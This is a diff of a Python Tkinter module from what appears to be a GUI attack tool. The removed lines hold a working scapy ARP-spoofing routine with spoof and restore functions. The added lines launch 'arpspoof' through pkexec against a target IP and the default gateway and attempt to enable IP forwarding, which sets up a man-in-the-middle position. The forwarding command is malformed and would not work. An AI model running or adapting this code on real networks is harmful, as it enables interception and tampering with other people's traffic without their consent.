@@ -1,86 +1,61 @@
-import scapy.all as scapy
-import time
+import traceback
+import subprocess
 import threading
-
+import time
 from tkinter import *
 from ProgramSetup.Footer import Footer
 
 def startArp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, defaultGatewayIp) :
 
-    global is_running, arp_th
+    global terminalLabel, errorOutputLabel, isRunning, arpThread
 
-    arp_th = threading.Thread(target = arpLoop)
-    is_running = False
-
+    isRunning = False
+    arpThread = threading.Thread(target = lambda : arpLoop(targetIp, defaultGatewayIp))
+    
     terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
-    '''
-    try :
-        sentPacketsCount = 0
-        for i in range(1,3,1) :
-            
-            spoof(targetIp, defaultGatewayIp)
-            spoof(defaultGatewayIp, targetIp)
-            sentPacketsCount += 2
-            print("Running..")
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print("Stopping Process")
-        restore(defaultGatewayIp, targetIp)
-        restore(targetIp, defaultGatewayIp)
-        print("Process Stopped!")'''
-    
-    runArpAttack()
-    
+
+    #sudoPw = Footer.getSudoPass()
+    #print(sudoPw)
+    runArpAttack(targetIp, defaultGatewayIp)
+
     terminalLabel.pack(anchor = NW)
     errorOutputLabel.pack(anchor = NW)
 
-def stopArp() :
-    global arp_th, is_running
+def stopArp(targetIp, defaultGatewayIp) :
+    global arpThread, isRunning
     try:
-        is_running = False
-        arp_th.join(0)
-        arp_th = None
+        isRunning = False
+        arpThread.join(0)
+        arpThread = None
+        #restore(defaultGatewayIp, targetIp)
+        #restore(targetIp, defaultGatewayIp)
     except (AttributeError, RuntimeError):
         pass
 
-def runArpAttack():
-    global is_running
-    is_running = True
-    #arp_th = threading.Thread(target = arpLoop)
-    arp_th.start()
+def runArpAttack(targetIp, defaultGatewayIp):
+    global isRunning, arpThread
 
-def arpLoop():
+    isRunning = True
+    arpThread.start()
+
+def arpLoop(targetIp, defaultGatewayIp) :
+    interface = "eth0"
     count = 3
-    while is_running == True and count != 0:
-        print("Running..")
-        time.sleep(2)
-        count -= 1
-        
-    print("STOPPED..")
+    try :
+        while isRunning == True and count != 0:
+            print("ORANGES")
+            time.sleep(3)
+            count -= 1
+            terminalLabel['text'] += "$ echo > l /proc/sys/net/ipv4/ip_forward \n"
+            terminalProcess = subprocess.Popen(["echo", ">", "l", "/proc/sys/net/ipv4/ip_forward"], stdout=subprocess.PIPE, universal_newlines=TRUE)
+            terminalLabel['text'] += terminalProcess.communicate()[0]
 
-def get_mac(targetIp):
-    arp_request = scapy.ARP(pdst = targetIp)
-    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
-
-    return answered_list[0][1].hwsrc
-
-def spoof(targetIp, defaultGatewayIp):
-    packet = scapy.ARP(op = 2, pdst = targetIp, 
-                     hwdst = get_mac(targetIp), 
-                               psrc = defaultGatewayIp)
-  
-    scapy.send(packet, verbose = False)
+            terminalLabel['text'] += "$ arpspoof -i " + interface + " -t " + targetIp + " -r " + defaultGatewayIp + " \n"
+            terminalProcess = subprocess.Popen(["pkexec", "arpspoof", "-i", interface, "-t", targetIp, "-r", defaultGatewayIp], stdout=subprocess.PIPE, universal_newlines=TRUE)
+    except Exception:
+        errorOutputLabel['text'] += traceback.format_exc()
 
 
-def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op = 2, pdst = destination_ip, 
-                             hwdst = destination_mac, 
-                psrc = source_ip, hwsrc = source_mac)
-  
-    scapy.send(packet, verbose = False)
+
